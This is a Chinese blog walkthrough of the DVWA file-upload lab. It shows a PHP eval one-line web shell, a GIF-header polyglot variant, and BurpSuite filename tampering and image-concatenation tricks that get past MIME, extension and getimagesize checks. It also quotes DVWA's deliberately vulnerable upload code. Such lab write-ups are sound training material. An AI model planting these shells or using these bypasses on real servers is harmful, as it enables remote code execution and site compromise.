---

title: DVWA File Upload
date: 2020-12-21 10:01:48
categories: dvwa
tags: 
- file
---

## 文件上传

### low 级别

将 php 一句话木马, 保存为 php 文件上传

```php
<?php @eval($_POST['attack']) ?>
```

![file-upload-low1](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-low1.jpg)

<!-- more -->

通过 [蚁剑](https://github.com/AntSwordProject/) 测试连接, 连接密码为 `$_POST` 的内容

![file-upload-low2](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-low2.jpg)

连接成功可以获取目录结构, 并且可以使用受限制的 shell (apache权限)

![file-upload-low3](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-low3.jpg)

![file-upload-low4](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-low4.jpg)

### medium 级别

source

```php
// Is it an image?
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
    ( $uploaded_size < 100000 ) ) {
    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
else {
    // Invalid file
    echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
}
```

限制了上传文件的类型, 只能上传 JPEG 或 PNG 的图片格式

![file-upload-medium1](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-medium1.jpg)

将 1.php 重命名为 2.jpg, 用 BurpSuite 截断上传, 修改提交的数据

![file-upload-medium2](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-medium2.jpg)

将请求数据的文件名 2.jpg 修改为 2.php, 再 Forward 转发, 即可将 2.jpg 在服务器端重命名为 2.php

![file-upload-medium3](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-medium3.jpg)

用蚁剑测试 2.php 连接, 可以成功连接

![file-upload-medium4](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-medium4.jpg)

### high级别

high 级别限制了文件后缀, 并且使用 `getimagesize` 读取图片信息, 确保上传的文件是图片

**source**

```php
// Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
```

可以使用 copy 命令将真实图片和 php 合并, logo.jpg 为真实图片

```cmd
C:\>copy logo.jpg/b + 1.php 3.jpg
logo.jpg
1.php
已复制         1 个文件。
```

![file-upload-high1](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-high1.jpg)

合成后的 png 文件可以成功上传

![file-upload-high2](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-high2.jpg)

使用 **GIF98** 也可以, 将以下内容另存为 .jpg 或 .png 文件, 也可以上传成功

```php
GIF98
<?php @eval($_POST['attack']) ?>
```

需要配合 File Inclusion 的 url 使用

![file-upload-high3](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-high3.jpg)

需要使用 BurpSuite 获取 Cookie 并添加到请求头才可以连接成功

![file-upload-high4](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/file-upload-high4.jpg)

### impossible 级别

添加了 md5 加密, 文件名不可控

```php
// Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
```